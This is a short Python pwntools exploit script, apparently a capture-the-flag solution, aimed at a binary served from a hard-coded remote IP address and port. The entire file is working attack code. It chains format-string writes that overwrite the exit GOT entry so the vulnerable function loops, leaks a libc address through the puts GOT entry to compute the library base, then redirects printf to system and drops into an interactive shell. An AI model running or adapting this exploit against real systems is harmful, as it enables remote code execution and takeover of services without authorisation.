#!/usr/bin/python3

from pwn import *

io = remote("185.172.165.118", 2626)
elf = ELF("./pwn")

context.clear(arch="amd64")

def loop_back():
        """ This is used to give recursive calls to vuln function"""
        io.recvline()
        payload = fmtstr_payload(6, {elf.got.exit: elf.sym.vuln}, write_size="short")
        io.sendline(payload)
        null = payload.find(b"\x00")
        io.recvuntil(payload[null-2:null])

def leak_address():
        """ This is used to leak the glibc address"""
        payload = b" -%7$s- "
        payload += p64(elf.got.puts)
        io.sendline(payload)
        sleep(1)
        leaked_address = u64(io.recv(20).decode("latin-1").split("-")[1].ljust(8, "\x00"))
        base_address = leaked_address - 0x0875a0
        log.info("Leaked Address: {}".format(hex(leaked_address)))
        log.info("Base Address: {}".format(hex(base_address)))
        return base_address

def final_exploit(base_address):
        """ This is used to overwrite the got table of printf with system"""
        address = base_address + 0x055410
        payload = fmtstr_payload(6, {elf.got.printf: address}, write_size="short")
        io.sendline(payload)
        null = payload.find(b"\x00")
        io.recvuntil(payload[null-2:null])

def main():
        loop_back()
        base_address = leak_address()
        final_exploit(base_address)
        io.interactive()

if __name__ == "__main__":
        main()
